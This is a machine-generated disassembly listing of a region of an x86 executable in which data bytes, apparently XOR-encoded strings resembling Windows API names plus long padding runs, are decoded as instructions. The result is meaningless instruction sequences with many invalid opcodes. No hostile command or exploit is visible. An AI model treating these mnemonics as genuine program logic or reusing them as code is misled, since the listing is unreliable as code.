  40b515:	a9 0e c6 0f d2       	test   $0xd20fc60e,%eax
  40b51a:	0d c1 14 c9 0f       	or     $0xfc914c1,%eax
  40b51f:	ce                   	into
  40b520:	a0 60 a0 a6 12       	mov    0x12a6a060,%al
  40b525:	c5 05 b3 09 c4 a0    	lds    0xa0c409b3,%eax
  40b52b:	60                   	pusha
  40b52c:	a0 a5 11 d5 01       	mov    0x1d511a5,%al
  40b531:	cc                   	int3
  40b532:	f3 c9                	repz leave
  40b534:	04 60                	add    $0x60,%al
  40b536:	a0 60 a0 a1 0c       	mov    0xca1a060,%al
  40b53b:	cc                   	int3
  40b53c:	0f c3 01             	movnti %eax,(%ecx)
  40b53f:	d4 05                	aam    $0x5
  40b541:	a1 0e c4 e9 ce       	mov    0xcee9c40e,%eax
  40b546:	09 d4                	or     %edx,%esp
  40b548:	09 c1                	or     %eax,%ecx
  40b54a:	0c c9                	or     $0xc9,%al
  40b54c:	1a c5                	sbb    %ch,%al
  40b54e:	f3 c9                	repz leave
  40b550:	04 60                	add    $0x60,%al
  40b552:	a0 cb 05 d2 0e       	mov    0xed205cb,%al
  40b557:	c5 0c 93             	lds    (%ebx,%edx,4),%ecx
  40b55a:	d2 8e 04 cc 0c 60    	rorb   %cl,0x600ccc04(%esi)
  40b560:	a0 60 a0 b7 01       	mov    0x1b7a060,%al
  40b565:	c9                   	leave
  40b566:	14 a6                	adc    $0xa6,%al
  40b568:	0f d2 f3             	psrld  %mm3,%mm6
  40b56b:	c9                   	leave
  40b56c:	0e                   	push   %cs
  40b56d:	c7                   	(bad)
  40b56e:	0c c5                	or     $0xc5,%al
  40b570:	ef                   	out    %eax,(%dx)
  40b571:	c2 0a c5             	ret    $0xc50a
  40b574:	03 d4                	add    %esp,%edx
  40b576:	a0 60 a0 b4 05       	mov    0x5b4a060,%al
  40b57b:	d2 0d c9 0e c1 14    	rorb   %cl,0x14c10ec9
  40b581:	c5 f0 d2             	(bad)
  40b584:	0f c3 05 d3 13 60 a0 	movnti %eax,0xa06013d3
  40b58b:	60                   	pusha
  40b58c:	a0 b3 0c c5 05       	mov    0x5c50cb3,%al
  40b591:	d0 a0 60 a0 b3 05    	shlb   $1,0x5b3a060(%eax)
  40b597:	d4 e5                	aam    $0xe5
  40b599:	d2 12                	rclb   %cl,(%edx)
  40b59b:	cf                   	iret
  40b59c:	12 ad 0f c4 05 60    	adc    0x6005c40f(%ebp),%ch
  40b5a2:	a0 60 a0 a7 05       	mov    0x5a7a060,%al
  40b5a7:	d4 f6                	aam    $0xf6
  40b5a9:	cf                   	iret
  40b5aa:	0c d5                	or     $0xd5,%al
  40b5ac:	0d c5 e9 ce 06       	or     $0x6cee9c5,%eax
  40b5b1:	cf                   	iret
  40b5b2:	12 cd                	adc    %ch,%cl
  40b5b4:	01 d4                	add    %edx,%esp
  40b5b6:	09 cf                	or     %ecx,%edi
  40b5b8:	0e                   	push   %cs
  40b5b9:	a1 a0 60 a0 a7       	mov    0xa7a060a0,%eax
  40b5be:	05 d4 f6 c5 12       	add    $0x12c5f6d4,%eax
  40b5c3:	d3 09                	rorl   %cl,(%ecx)
  40b5c5:	cf                   	iret
  40b5c6:	0e                   	push   %cs
  40b5c7:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40b5c8:	18 a1 a0 60 a0 a7    	sbb    %ah,-0x585f9f60(%ecx)
  40b5ce:	05 d4 f3 d9 13       	add    $0x13d9f3d4,%eax
  40b5d3:	d4 05                	aam    $0x5
  40b5d5:	cd e4                	int    $0xe4
  40b5d7:	c9                   	leave
  40b5d8:	12 c5                	adc    %ch,%al
  40b5da:	03 d4                	add    %esp,%edx
  40b5dc:	0f d2 19             	psrld  (%ecx),%mm3
  40b5df:	a1 a0 60 a0 a7       	mov    0xa7a060a0,%eax
  40b5e4:	05 d4 f3 d9 13       	add    $0x13d9f3d4,%eax
  40b5e9:	d4 05                	aam    $0x5
  40b5eb:	cd e4                	int    $0xe4
  40b5ed:	c5 06                	lds    (%esi),%eax
  40b5ef:	c1 15 cc 14 ac 01 ce 	rcll   $0xce,0x1ac14cc
  40b5f6:	07                   	pop    %es
  40b5f7:	a9 e4 60 a0 60       	test   $0x60a060e4,%eax
  40b5fc:	a0 a7 05 d4 ec       	mov    0xecd405a7,%al
  40b601:	c1 13 d4             	rcll   $0xd4,(%ebx)
  40b604:	e5 d2                	in     $0xd2,%eax
  40b606:	12 cf                	adc    %bh,%cl
  40b608:	12 60 a0             	adc    -0x60(%eax),%ah
  40b60b:	60                   	pusha
  40b60c:	a0 a7 05 d4 e6       	mov    0xe6d405a7,%al
  40b611:	c9                   	leave
  40b612:	0c c5                	or     $0xc5,%al
  40b614:	e1 d4                	loope  0x40b5ea
  40b616:	14 d2                	adc    $0xd2,%al
  40b618:	09 c2                	or     %eax,%edx
  40b61a:	15 d4 05 d3 e1       	adc    $0xe1d305d4,%eax
  40b61f:	60                   	pusha
  40b620:	a0 60 a0 a7 05       	mov    0x5a7a060,%al
  40b625:	d4 e5                	aam    $0xe5
  40b627:	d8 09                	fmuls  (%ecx)
  40b629:	d4 e3                	aam    $0xe3
  40b62b:	cf                   	iret
  40b62c:	04 c5                	add    $0xc5,%al
  40b62e:	f0 d2 0f             	lock rorb %cl,(%edi)
  40b631:	c3                   	ret
  40b632:	05 d3 13 60 a0       	add    $0xa06013d3,%eax
  40b637:	60                   	pusha
  40b638:	a0 a7 05 d4 e5       	mov    0xe5d405a7,%al
  40b63d:	ce                   	into
  40b63e:	16                   	push   %ss
  40b63f:	c9                   	leave
  40b640:	12 cf                	adc    %bh,%cl
  40b642:	0e                   	push   %cs
  40b643:	cd 05                	int    $0x5
  40b645:	ce                   	into
  40b646:	14 b6                	adc    $0xb6,%al
  40b648:	01 d2                	add    %edx,%edx
  40b64a:	09 c1                	or     %eax,%ecx
  40b64c:	02 cc                	add    %ah,%cl
  40b64e:	05 a1 a0 60 a0       	add    $0xa060a0a1,%eax
  40b653:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40b654:	05 d4 e3 d5 12       	add    $0x12d5e3d4,%eax
  40b659:	d2 05 ce 14 b4 08    	rolb   %cl,0x8b414ce
  40b65f:	d2 05 c1 04 60 a0    	rolb   %cl,0xa06004c1
  40b665:	60                   	pusha
  40b666:	a0 a7 05 d4 e3       	mov    0xe3d405a7,%al
  40b66b:	d5 12                	aad    $0x12
  40b66d:	d2 05 ce 14 b0 12    	rolb   %cl,0x12b014ce
  40b673:	cf                   	iret
  40b674:	03 c5                	add    %ebp,%eax
  40b676:	13 d3                	adc    %ebx,%edx
  40b678:	a0 60 a0 a6 09       	mov    0x9a6a060,%al
  40b67d:	ce                   	into
  40b67e:	04 ae                	add    $0xae,%al
  40b680:	05 d8 14 a6 09       	add    $0x9a614d8,%eax
  40b685:	cc                   	int3
  40b686:	05 a1 a0 60 a0       	add    $0xa060a0a1,%eax
  40b68b:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40b68c:	09 ce                	or     %ecx,%esi
  40b68e:	04 a6                	add    $0xa6,%al
  40b690:	09 d2                	or     %edx,%edx
  40b692:	13 d4                	adc    %esp,%edx
  40b694:	e6 c9                	out    %al,$0xc9
  40b696:	0c c5                	or     $0xc5,%al
  40b698:	e1 60                	loope  0x40b6fa
  40b69a:	a0 60 a0 a6 09       	mov    0x9a6a060,%al
  40b69f:	ce                   	into
  40b6a0:	04 a3                	add    $0xa3,%al
  40b6a2:	0c cf                	or     $0xcf,%al
  40b6a4:	13 c5                	adc    %ebp,%eax
  40b6a6:	a0 60 a0 a6 09       	mov    0x9a6a060,%al
  40b6ab:	cc                   	int3
  40b6ac:	05 b4 09 cd 05       	add    $0x5cd09b4,%eax
  40b6b1:	b4 0f                	mov    $0xf,%ah
  40b6b3:	ac                   	lods   %ds:(%esi),%al
  40b6b4:	0f c3 01             	movnti %eax,(%ecx)
  40b6b7:	cc                   	int3
  40b6b8:	e6 c9                	out    %al,$0xc9
  40b6ba:	0c c5                	or     $0xc5,%al
  40b6bc:	f4                   	hlt
  40b6bd:	c9                   	leave
  40b6be:	0d c5 a0 60 a0       	or     $0xa060a0c5,%eax
  40b6c3:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40b6c4:	09 cc                	or     %ecx,%esp
  40b6c6:	05 b4 09 cd 05       	add    $0x5cd09b4,%eax
  40b6cb:	b4 0f                	mov    $0xf,%ah
  40b6cd:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40b6ce:	0f d3 e4             	psrlq  %mm4,%mm4
  40b6d1:	c1 14 c5 f4 c9 0d c5 	rcll   $0xa0,-0x3af2360c(,%eax,8)
  40b6d8:	a0 
  40b6d9:	60                   	pusha
  40b6da:	a0 a4 05 cc 05       	mov    0x5cc05a4,%al
  40b6df:	d4 05                	aam    $0x5
  40b6e1:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40b6e2:	09 cc                	or     %ecx,%esp
  40b6e4:	05 a1 a0 60 a0       	add    $0xa060a0a1,%eax
  40b6e9:	a3 12 c5 01 d4       	mov    %eax,0xd401c512
  40b6ee:	05 b0 12 cf 03       	add    $0x3cf12b0,%eax
  40b6f3:	c5 13                	lds    (%ebx),%edx
  40b6f5:	d3 e1                	shl    %cl,%ecx
  40b6f7:	60                   	pusha
  40b6f8:	a0 60 a0 a3 12       	mov    0x12a3a060,%al
  40b6fd:	c5 01                	lds    (%ecx),%eax
  40b6ff:	d4 05                	aam    $0x5
  40b701:	ad                   	lods   %ds:(%esi),%eax
  40b702:	15 d4 05 d8 e1       	adc    $0xe1d805d4,%eax
  40b707:	60                   	pusha
  40b708:	a0 60 a0 a3 0c       	mov    0xca3a060,%al
  40b70d:	cf                   	iret
  40b70e:	13 c5                	adc    %ebp,%eax
  40b710:	e8 c1 0e c4 0c       	call   0xd04c5d6
  40b715:	c5 a0 d3 08 c5 0c    	lds    0xcc508d3(%eax),%esp
  40b71b:	cc                   	int3
  40b71c:	d3 92 ce c4 0c cc    	rcll   %cl,-0x33f33b32(%edx)
  40b722:	a0 60 a0 b3 08       	mov    0x8b3a060,%al
  40b727:	c5 0c cc             	lds    (%esp,%ecx,8),%ecx
  40b72a:	e5 d8                	in     $0xd8,%eax
  40b72c:	05 c3 15 d4 05       	add    $0x5d415c3,%eax
  40b731:	a1 a0 d7 13 cf       	mov    0xcf13d7a0,%eax
  40b736:	03 cb                	add    %ebx,%ecx
  40b738:	d3 92 ce c4 0c cc    	rcll   %cl,-0x33f33b32(%edx)
  40b73e:	a0 60 a0 b7 f3       	mov    0xf3b7a060,%al
  40b743:	a1 f3 d4 01 d2       	mov    0xd201d4f3,%eax
  40b748:	14 d5                	adc    $0xd5,%al
  40b74a:	10 60 a0             	adc    %ah,-0x60(%eax)
  40b74d:	60                   	pusha
  40b74e:	a0 c7 05 d4 08       	mov    0x8d405c7,%al
  40b753:	cf                   	iret
  40b754:	13 d4                	adc    %esp,%edx
  40b756:	02 d9                	add    %cl,%bl
  40b758:	0e                   	push   %cs
  40b759:	c1 0d c5 a0 d7 09 ce 	rorl   $0xce,0x9d7a0c5
  40b760:	09 ce                	or     %ecx,%esi
  40b762:	05 d4 ce c4 0c       	add    $0xcc4ced4,%eax
  40b767:	cc                   	int3
  40b768:	a0 60 a0 a9 0e       	mov    0xea9a060,%al
  40b76d:	d4 05                	aam    $0x5
  40b76f:	d2 0e                	rorb   %cl,(%esi)
  40b771:	c5 14 b2             	lds    (%edx,%esi,4),%edx
  40b774:	05 c1 04 a6 09       	add    $0x9a604c1,%eax
  40b779:	cc                   	int3
  40b77a:	05 60 a0 60 a0       	add    $0xa060a060,%eax
  40b77f:	a9 0e d4 05 d2       	test   $0xd205d40e,%eax
  40b784:	0e                   	push   %cs
  40b785:	c5 14 af             	lds    (%edi,%ebp,4),%edx
  40b788:	10 c5                	adc    %al,%ch
  40b78a:	0e                   	push   %cs
  40b78b:	b5 12                	mov    $0x12,%ch
  40b78d:	cc                   	int3
  40b78e:	e1 60                	loope  0x40b7f0
  40b790:	a0 60 a0 a9 0e       	mov    0xea9a060,%al
  40b795:	d4 05                	aam    $0x5
  40b797:	d2 0e                	rorb   %cl,(%esi)
  40b799:	c5 14 af             	lds    (%edi,%ebp,4),%edx
  40b79c:	10 c5                	adc    %al,%ch
  40b79e:	0e                   	push   %cs
  40b79f:	a1 a0 60 a0 a9       	mov    0xa9a060a0,%eax
  40b7a4:	0e                   	push   %cs
  40b7a5:	d4 05                	aam    $0x5
  40b7a7:	d2 0e                	rorb   %cl,(%esi)
  40b7a9:	c5 14 a3             	lds    (%ebx,%eiz,4),%edx
  40b7ac:	0c cf                	or     $0xcf,%al
  40b7ae:	13 c5                	adc    %ebp,%eax
  40b7b0:	e8 c1 0e c4 0c       	call   0xd04c676
  40b7b5:	c5 a0 60 a0 60 a0    	lds    -0x5f9f5fa0(%eax),%esp
  40b7bb:	60                   	pusha
  40b7bc:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b7c1:	60                   	pusha
  40b7c2:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b7c7:	60                   	pusha
  40b7c8:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b7cd:	60                   	pusha
  40b7ce:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b7d3:	60                   	pusha
  40b7d4:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b7d9:	60                   	pusha
  40b7da:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b7df:	60                   	pusha
  40b7e0:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b7e5:	60                   	pusha
  40b7e6:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b7eb:	60                   	pusha
  40b7ec:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b7f1:	60                   	pusha
  40b7f2:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b7f7:	60                   	pusha
  40b7f8:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b7fd:	60                   	pusha
  40b7fe:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b803:	60                   	pusha
  40b804:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b809:	60                   	pusha
  40b80a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b80f:	60                   	pusha
  40b810:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b815:	60                   	pusha
  40b816:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b81b:	60                   	pusha
  40b81c:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b821:	60                   	pusha
  40b822:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b827:	60                   	pusha
  40b828:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b82d:	60                   	pusha
  40b82e:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b833:	60                   	pusha
  40b834:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b839:	60                   	pusha
  40b83a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b83f:	60                   	pusha
  40b840:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b845:	60                   	pusha
  40b846:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b84b:	60                   	pusha
  40b84c:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b851:	60                   	pusha
  40b852:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b857:	60                   	pusha
  40b858:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b85d:	60                   	pusha
  40b85e:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b863:	60                   	pusha
  40b864:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b869:	60                   	pusha
  40b86a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b86f:	60                   	pusha
  40b870:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b875:	60                   	pusha
  40b876:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b87b:	60                   	pusha
  40b87c:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b881:	60                   	pusha
  40b882:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b887:	60                   	pusha
  40b888:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b88d:	60                   	pusha
  40b88e:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b893:	60                   	pusha
  40b894:	a0 92 e0 61 a0       	mov    0xa061e092,%al
  40b899:	61                   	popa
  40b89a:	a0 60 a0 61 a0       	mov    0xa061a060,%al
  40b89f:	60                   	pusha
  40b8a0:	a0 61 a0 60 a0       	mov    0xa060a061,%al
  40b8a5:	88 e0                	mov    %ah,%al
  40b8a7:	61                   	popa
  40b8a8:	a0 8c e0 61 a0       	mov    0xa061e08c,%al
  40b8ad:	90                   	nop
  40b8ae:	e0 61                	loopne 0x40b911
  40b8b0:	a0 78 2a 60 a0       	mov    0xa0602a78,%al
  40b8b5:	a0 e0 61 a0 60       	mov    0x60a061e0,%al
  40b8ba:	a0 a7 05 d4 14       	mov    0x14d405a7,%al
  40b8bf:	c5 12                	lds    (%edx),%edx
  40b8c1:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40b8c2:	ec                   	in     (%dx),%al
  40b8c3:	ac                   	lods   %ds:(%esi),%al
  40b8c4:	ce                   	into
  40b8c5:	c4 0c cc             	les    (%esp,%ecx,8),%ecx
  40b8c8:	a0 a1 a0 60 a0       	mov    0xa060a0a1,%al
  40b8cd:	60                   	pusha
  40b8ce:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b8d3:	60                   	pusha
  40b8d4:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b8d9:	60                   	pusha
  40b8da:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b8df:	60                   	pusha
  40b8e0:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b8e5:	60                   	pusha
  40b8e6:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b8eb:	60                   	pusha
  40b8ec:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b8f1:	60                   	pusha
  40b8f2:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b8f7:	60                   	pusha
  40b8f8:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b8fd:	60                   	pusha
  40b8fe:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b903:	60                   	pusha
  40b904:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b909:	60                   	pusha
  40b90a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b90f:	60                   	pusha
  40b910:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b915:	60                   	pusha
  40b916:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b91b:	60                   	pusha
  40b91c:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b921:	60                   	pusha
  40b922:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b927:	60                   	pusha
  40b928:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b92d:	60                   	pusha
  40b92e:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b933:	60                   	pusha
  40b934:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b939:	60                   	pusha
  40b93a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b93f:	60                   	pusha
  40b940:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b945:	60                   	pusha
  40b946:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b94b:	60                   	pusha
  40b94c:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b951:	60                   	pusha
  40b952:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b957:	60                   	pusha
  40b958:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b95d:	60                   	pusha
  40b95e:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b963:	60                   	pusha
  40b964:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b969:	60                   	pusha
  40b96a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b96f:	60                   	pusha
  40b970:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b975:	60                   	pusha
  40b976:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b97b:	60                   	pusha
  40b97c:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b981:	60                   	pusha
  40b982:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b987:	60                   	pusha
  40b988:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b98d:	60                   	pusha
  40b98e:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b993:	60                   	pusha
  40b994:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b999:	60                   	pusha
  40b99a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b99f:	60                   	pusha
  40b9a0:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b9a5:	60                   	pusha
  40b9a6:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b9ab:	60                   	pusha
  40b9ac:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b9b1:	60                   	pusha
  40b9b2:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b9b7:	60                   	pusha
  40b9b8:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b9bd:	60                   	pusha
  40b9be:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b9c3:	60                   	pusha
  40b9c4:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b9c9:	60                   	pusha
  40b9ca:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b9cf:	60                   	pusha
  40b9d0:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b9d5:	60                   	pusha
  40b9d6:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b9db:	60                   	pusha
  40b9dc:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b9e1:	60                   	pusha
  40b9e2:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b9e7:	60                   	pusha
  40b9e8:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b9ed:	60                   	pusha
  40b9ee:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b9f3:	60                   	pusha
  40b9f4:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b9f9:	60                   	pusha
  40b9fa:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b9ff:	60                   	pusha
  40ba00:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40ba05:	60                   	pusha
  40ba06:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40ba0b:	60                   	pusha
  40ba0c:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40ba11:	60                   	pusha
  40ba12:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40ba17:	60                   	pusha
  40ba18:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40ba1d:	60                   	pusha
  40ba1e:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40ba23:	60                   	pusha
  40ba24:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40ba29:	60                   	pusha
  40ba2a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40ba2f:	60                   	pusha
  40ba30:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40ba35:	60                   	pusha
  40ba36:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40ba3b:	60                   	pusha
  40ba3c:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40ba41:	60                   	pusha
  40ba42:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40ba47:	60                   	pusha
  40ba48:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40ba4d:	60                   	pusha
  40ba4e:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40ba53:	60                   	pusha
  40ba54:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40ba59:	60                   	pusha
  40ba5a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40ba5f:	60                   	pusha
  40ba60:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40ba65:	60                   	pusha
  40ba66:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40ba6b:	60                   	pusha
  40ba6c:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40ba71:	60                   	pusha
  40ba72:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40ba77:	60                   	pusha
  40ba78:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40ba7d:	60                   	pusha
  40ba7e:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40ba83:	60                   	pusha
  40ba84:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40ba89:	60                   	pusha
  40ba8a:	b0 60                	mov    $0x60,%al
  40ba8c:	a0 40 a0 60 a0       	mov    0xa060a040,%al
  40ba91:	60                   	pusha
  40ba92:	d0 6c d0 8c          	shrb   $1,-0x74(%eax,%edx,8)
  40ba96:	d0 98 d0 9c d0 a0    	rcrb   $1,-0x5f2f6330(%eax)
  40ba9c:	d0 a4 d0 a8 d0 ac d0 	shlb   $1,-0x2f532f58(%eax,%edx,8)
  40baa3:	b0 d0                	mov    $0xd0,%al
  40baa5:	b4 d0                	mov    $0xd0,%ah
  40baa7:	c2 d0 ca             	ret    $0xcad0
  40baaa:	d0 d2                	rcl    $1,%dl
  40baac:	d0 da                	rcr    $1,%dl
  40baae:	d0 e2                	shl    $1,%dl
  40bab0:	d0 ea                	shr    $1,%dl
  40bab2:	d0 f2                	shl    $1,%dl
  40bab4:	d0 fa                	sar    $1,%dl
  40bab6:	d0 02                	rolb   $1,(%edx)
  40bab8:	d0 0a                	rorb   $1,(%edx)
  40baba:	d0 12                	rclb   $1,(%edx)
  40babc:	d0 1a                	rcrb   $1,(%edx)
  40babe:	d0 22                	shlb   $1,(%edx)
  40bac0:	d0 2a                	shrb   $1,(%edx)
  40bac2:	d0 32                	shlb   $1,(%edx)
  40bac4:	d0 3a                	sarb   $1,(%edx)
  40bac6:	d0 42 d0             	rolb   $1,-0x30(%edx)
  40bac9:	4a                   	dec    %edx
  40baca:	d0 52 d0             	rclb   $1,-0x30(%edx)
  40bacd:	5a                   	pop    %edx
  40bace:	d0 62 d1             	shlb   $1,-0x2f(%edx)
  40bad1:	6a d1                	push   $0xffffffd1
  40bad3:	72 d1                	jb     0x40baa6
  40bad5:	7a d1                	jp     0x40baa8
  40bad7:	82 d1 8a             	adc    $0x8a,%cl
  40bada:	d1 92 d1 9a d1 a2    	rcll   $1,-0x5d2e652f(%edx)
  40bae0:	d1 aa d1 b2 d1 ba    	shrl   $1,-0x452e4d2f(%edx)
  40bae6:	d1 c2                	rol    $1,%edx
  40bae8:	d1 ca                	ror    $1,%edx
  40baea:	d1 d2                	rcl    $1,%edx
  40baec:	d1 d8                	rcr    $1,%eax
  40baee:	d1 e9                	shr    $1,%ecx
  40baf0:	d1 f2                	shl    $1,%edx
  40baf2:	d1 0b                	rorl   $1,(%ebx)
  40baf4:	d1 14 d1             	rcll   $1,(%ecx,%edx,8)
  40baf7:	26 d1 3e             	sarl   $1,%es:(%esi)
  40bafa:	d1 5f d1             	rcrl   $1,-0x2f(%edi)
  40bafd:	78 d2                	js     0x40bad1
  40baff:	91                   	xchg   %eax,%ecx
  40bb00:	d2 a2 d2 b7 d2 c4    	shlb   %cl,-0x3b2d482e(%edx)
  40bb06:	d2 e4                	shl    %cl,%ah
  40bb08:	d2 c3                	rol    %cl,%bl
  40bb0a:	d4 fc                	aam    $0xfc
  40bb0c:	d4 aa                	aam    $0xaa
  40bb0e:	d5 bf                	aad    $0xbf
  40bb10:	d6                   	salc
  40bb11:	e8 d6 ef d6 f6       	call   0xf717aaec
  40bb16:	d6                   	salc
  40bb17:	c6                   	(bad)
  40bb18:	d7                   	xlat   %ds:(%ebx)
  40bb19:	db d7                	fcmovnbe %st(7),%st
  40bb1b:	0e                   	push   %cs
  40bb1c:	d7                   	xlat   %ds:(%ebx)
  40bb1d:	5e                   	pop    %esi
  40bb1e:	d7                   	xlat   %ds:(%ebx)
  40bb1f:	70 d8                	jo     0x40baf9
  40bb21:	a2 d8 aa d8 4a       	mov    %al,0x4ad8aad8
  40bb26:	d8 6a d9             	fsubrs -0x27(%edx)
  40bb29:	bd d9 81 da 8c       	mov    $0x8cda81d9,%ebp
  40bb2e:	da f8                	(bad)
  40bb30:	da ff                	(bad)
  40bb32:	da 10                	ficoml (%eax)
  40bb34:	da 1c da             	ficompl (%edx,%ebx,8)
  40bb37:	6c                   	insb   (%dx),%es:(%edi)
  40bb38:	db a2 db 99 dc 1b    	(bad) 0x1bdc99db(%edx)
  40bb3e:	dd 7a de             	fnstsw -0x22(%edx)
  40bb41:	8e de                	mov    %esi,%ds
  40bb43:	96                   	xchg   %eax,%esi
  40bb44:	de ac de c4 de d2 de 	fisubrs -0x212d213c(%esi,%ebx,8)
  40bb4b:	06                   	push   %es
  40bb4c:	de 22                	fisubs (%edx)
  40bb4e:	de 2e                	fisubrs (%esi)
  40bb50:	de 42 de             	fiadds -0x22(%edx)
  40bb53:	4c                   	dec    %esp
  40bb54:	de 5f de             	ficomps -0x22(%edi)
  40bb57:	8f                   	(bad)
  40bb58:	df bc df c5 df f7 df 	fistpll -0x2008203b(%edi,%ebx,8)
  40bb5f:	00 df                	add    %bl,%bh
  40bb61:	35 df 3c df 5e       	xor    $0x5edf3cdf,%eax
  40bb66:	df 60 a0             	fbld   -0x60(%eax)
  40bb69:	60                   	pusha
  40bb6a:	c0 60 a0 e0          	shlb   $0xe0,-0x60(%eax)
  40bb6e:	a0 60 a0 ab d0       	mov    0xd0aba060,%al
  40bb73:	d3 d0                	rcl    %cl,%eax
